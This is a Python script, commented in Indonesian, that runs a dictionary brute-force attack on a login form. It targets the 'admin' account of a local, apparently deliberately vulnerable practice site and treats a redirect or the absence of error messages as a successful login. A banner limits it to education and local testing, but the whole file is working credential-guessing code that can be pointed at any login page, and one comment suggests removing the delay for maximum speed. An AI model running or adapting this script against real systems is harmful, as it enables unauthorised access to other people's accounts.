import requests
import time
import sys

# =======================================================================
# ⚠️ SKRIP INI HANYA UNTUK EDUKASI DAN PENGUJIAN LOKAL!
# JANGAN GUNAKAN UNTUK MENYERANG SERVER TANPA IZIN (ILEGAL).
# =======================================================================

# Target URL (Pastikan server XAMPP / PHP berjalan)
TARGET_URL = "http://localhost:8000/CyberTarget_Web/vuln/login.php"
USERNAME_TARGET = "admin"
WORDLIST_FILE = "passwords.txt"

print(f"[*] Memulai serangan Brute Force terhadap {TARGET_URL}")
print(f"[*] Target Username: {USERNAME_TARGET}")

try:
    with open(WORDLIST_FILE, "r") as file:
        passwords = file.readlines()
except FileNotFoundError:
    print(f"[!] File {WORDLIST_FILE} tidak ditemukan!")
    sys.exit(1)

print(f"[*] Memuat {len(passwords)} password dari kamus...\n")

success = False
start_time = time.time()

for pwd in passwords:
    pwd = pwd.strip()
    if not pwd:
        continue
        
    print(f"[*] Mencoba password: {pwd}")
    
    # Data yang dikirim melalui HTTP POST
    data = {
        "username": USERNAME_TARGET,
        "password": pwd
    }
    
    try:
        # Kita menggunakan 'allow_redirects=False' karena jika login berhasil,
        # biasanya aplikasi akan me-redirect (HTTP 302) ke dashboard (index.php)
        response = requests.post(TARGET_URL, data=data, allow_redirects=False)
        
        # Cek apakah response berupa HTTP 302 (Redirect) yang berarti login sukses
        if response.status_code == 302 and "Location" in response.headers:
            print(f"\n[+] SUCCESS! Password ditemukan: '{pwd}'")
            success = True
            break
            
        # Alternatif: Cek jika pesan error "Password salah" tidak ada di body HTML
        elif "Password salah" not in response.text and "Username tidak ditemukan" not in response.text:
             print(f"\n[+] KEMUNGKINAN SUCCESS (No error found): '{pwd}'")
             success = True
             break
             
    except requests.exceptions.RequestException as e:
        print(f"[!] Koneksi gagal: {e}")
        break
        
    # Sedikit delay agar terminal tidak terlalu pusing (Opsional, hapus untuk brute force maksimal)
    time.sleep(0.1)

end_time = time.time()
print(f"\n[*] Selesai dalam {round(end_time - start_time, 2)} detik.")
if not success:
    print("[-] Password tidak ditemukan dalam wordlist.")
